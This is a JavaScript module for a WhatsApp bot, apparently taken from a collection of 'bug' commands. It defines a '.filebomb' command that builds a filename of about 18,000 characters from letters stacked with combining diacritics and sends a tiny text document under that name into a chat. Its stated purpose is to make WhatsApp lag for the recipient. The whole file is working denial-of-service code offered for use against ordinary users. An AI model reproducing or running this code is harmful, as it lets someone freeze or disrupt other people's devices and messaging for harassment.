
// ── 2. FILENAME BOMB ────────────────────────────────────────────
// Document with oversized filename causes lag on open
module.exports = {
    name: 'filebomb',
    alias: ['fbomb', 'docbug'],
    category: 'Bug/Safe',
    desc: 'Send a document with an oversized filename that lags WhatsApp',
    usage: `.filebomb`,

    execute: async (sock, m, { reply }) => {
        const combiners =
            '\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307\u0308\u0309' +
            '\u0316\u0317\u0318\u0319\u031A\u031B\u031C\u031D\u031E\u031F' +
            '\u0330\u0331\u0332\u0333\u0334\u0335\u0336\u0337\u0338\u0339';
        const anchors = 'abcdefghijklmnopqrstuvwxyz';

        // Build a zalgo filename
        let fileName = '';
        for (let i = 0; i < 2000; i++) {
            fileName += anchors[Math.floor(Math.random() * anchors.length)];
            for (let s = 0; s < 8; s++) {
                fileName += combiners[Math.floor(Math.random() * combiners.length)];
            }
        }
        fileName += '.txt';

        // Tiny real file — content doesn't matter
        const fileBuffer = Buffer.from('X'.repeat(512));

        await sock.sendMessage(m.chat, {
            document: fileBuffer,
            mimetype: 'text/plain',
            fileName: fileName,
            fileLength: fileBuffer.length
        }, { quoted: m });

        await sock.sendMessage(m.chat, { react: { text: '🐛', key: m.key } });
    }
};
